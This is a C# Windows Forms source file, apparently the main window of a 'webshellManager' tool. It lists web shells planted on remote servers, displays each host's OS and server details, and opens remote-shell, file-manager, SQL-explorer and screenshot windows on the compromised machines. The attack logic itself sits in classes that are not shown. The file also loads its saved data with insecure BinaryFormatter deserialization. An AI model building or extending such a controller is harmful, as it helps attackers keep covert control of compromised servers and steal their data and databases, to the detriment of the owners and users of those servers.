using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.IO;
using System.Net;
using System.Windows.Forms;

namespace webshellManager
{
    public partial class wsManagerForm : Form
    {
        private List<Webshell> webshells = new List<Webshell>();

        public wsManagerForm()
        {
            InitializeComponent();
        }

        private Webshell selectedWs(ListViewItem selected)
        {
            foreach (Webshell ws in webshells)
            {
                if (selected.Name == ws.getUrl()) return ws;
            }
            Console.WriteLine("The selected webshell is not in the list of webshells");
            return null;
        }

        public void refreshListViewInfos()
        {
            foreach (Webshell ws in webshells)
            {
                if (!lvWebShells.Items.ContainsKey(ws.getUrl()))
                {
                    IDictionary<string, string> inf = ws.querybasicalInformation();
                    ListViewItem lvi = new ListViewItem(new string[] { ws.getUrl(), inf["OS"], inf["Hostname"], inf["Release Name"], inf["Server Software"] });
                    lvi.Name = ws.getUrl();
                    lvWebShells.Items.Add(lvi);
                }
            }
            tssLabel.Text = lvWebShells.Items.Count.ToString() + " server(s)";
        }

        private void tsButtonAdd_Click(object sender, EventArgs e)
        {
            addWebshellForm addForm = new addWebshellForm(ref webshells, this);
            addForm.Show();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            refreshListViewInfos();
        }

        private void informationsToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lvWebShells.SelectedItems.Count > 0)
            {
                foreach (ListViewItem lvI in lvWebShells.SelectedItems)
                {
                    informationsForm infoForm = new informationsForm(selectedWs(lvI)); // manque param
                    infoForm.Show();
                }
            }
        }

        private void deleteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lvWebShells.SelectedItems.Count == 1)
            {
                for (int i = webshells.Count - 1; i >= 0; i--)
                {
                    if (lvWebShells.SelectedItems[0].Name == webshells[i].getUrl())
                    {
                        webshells.Remove(webshells[i]);
                        lvWebShells.SelectedItems[0].Remove();
                        tssLabel.Text = lvWebShells.Items.Count.ToString() + " server(s)";
                    };
                }
            }
        }

        private void shellToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lvWebShells.SelectedItems.Count > 0)
            {
                foreach (ListViewItem lvI in lvWebShells.SelectedItems)
                {
                    shellForm shellForm = new shellForm(selectedWs(lvI));
                    shellForm.Show();
                }
            }
        }

        private void fileManagerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lvWebShells.SelectedItems.Count > 0)
            {
                foreach (ListViewItem lvI in lvWebShells.SelectedItems)
                {
                    fileManagerForm fileManagerForm = new fileManagerForm(selectedWs(lvI));
                    fileManagerForm.Show();
                }
            }
        }

        private void sQLExplorerToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lvWebShells.SelectedItems.Count > 0)
            {
                foreach (ListViewItem lvI in lvWebShells.SelectedItems)
                {
                    sqlForm sqlForm = new sqlForm(selectedWs(lvI));
                    sqlForm.Show();
                }
            }
        }

        private void cMenuStripLV_Opening(object sender, CancelEventArgs e)
        {
            if (lvWebShells.SelectedItems.Count == 0)
            {
                cMenuStripLV.Items[0].Enabled = cMenuStripLV.Items[1].Enabled = cMenuStripLV.Items[2].Enabled =
                    cMenuStripLV.Items[3].Enabled = cMenuStripLV.Items[4].Enabled = cMenuStripLV.Items[5].Enabled = 
                    cMenuStripLV.Items[6].Enabled = false;
            }
            else
            {
                cMenuStripLV.Items[0].Enabled = cMenuStripLV.Items[1].Enabled = cMenuStripLV.Items[2].Enabled =
                cMenuStripLV.Items[3].Enabled = cMenuStripLV.Items[6].Enabled = true;
                
                if (lvWebShells.SelectedItems[0].SubItems[1].Text.ToUpper().Contains("WIN"))
                {
                    cMenuStripLV.Items[4].Enabled = true;
                } else cMenuStripLV.Items[4].Enabled = false;
            }
        }

        private void tsButtonSave_Click(object sender, EventArgs e)
        {
            using (Stream stream = System.IO.File.Open(Environment.CurrentDirectory + "\\webshells.dat", FileMode.Create))
            {
                var binaryFormatter = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();
                binaryFormatter.Serialize(stream, webshells);
                MessageBox.Show("data saved in webshells.dat");
            }
        }

        private void wsManagerForm_Load(object sender, EventArgs e)
        {
            try
            {
                using (Stream stream = System.IO.File.Open(Environment.CurrentDirectory + "\\webshells.dat", FileMode.Open))
                {
                    var binaryFormatter = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();
                    webshells = (List<Webshell>)binaryFormatter.Deserialize(stream);
                    foreach (Webshell ws in webshells) ws.setWebClient(new WebClient());
                }
            }
            catch
            {
                MessageBox.Show("can't load the data of webshells.dat");
                tsButtonSave.PerformClick(); //generate valid dat file
            }
            refreshListViewInfos();
        }

        private void tsButtonAbout_Click(object sender, EventArgs e)
        {
            aboutForm aboutForm = new aboutForm();
            aboutForm.Show();
        }

        private void ScreenshotToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (lvWebShells.SelectedItems.Count > 0)
            {
                foreach (ListViewItem lvI in lvWebShells.SelectedItems)
                {
                    screenshotForm screenForm = new screenshotForm(selectedWs(lvI));
                    screenForm.Show();
                }
            }
        }
    }
}
